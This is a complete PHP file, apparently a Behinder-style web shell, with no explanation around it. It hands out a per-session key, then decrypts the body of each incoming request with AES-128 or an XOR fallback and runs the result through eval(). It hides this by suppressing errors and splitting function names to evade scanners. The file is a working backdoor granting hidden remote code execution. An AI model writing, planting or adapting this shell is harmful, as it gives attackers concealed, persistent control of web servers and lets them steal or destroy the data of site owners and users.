<?php
@error_reporting(0);
session_start();
if (isset($_GET['rank']))
{
	$key=substr(md5(uniqid(rand())),16);
	$_SESSION['xve']=$key;
	print $key;
}
else
{
	$xc_i=$_SESSION['xve'];
	$xc_data=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$xc_data=$t($xc_data."");
		
		for($i=0;$i<strlen($xc_data);$i++) {
			$xc_data[$i] = $xc_data[$i]^$xc_i[$i+1&15]; 
		}
	}
	else
	{
		$xc_data=openssl_decrypt($xc_data, "AES128", $xc_i);
	}
	$arr=explode('|',$xc_data);
	$func=$arr[0];
	$params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
	@call_user_func(new C(),$params);
}
?>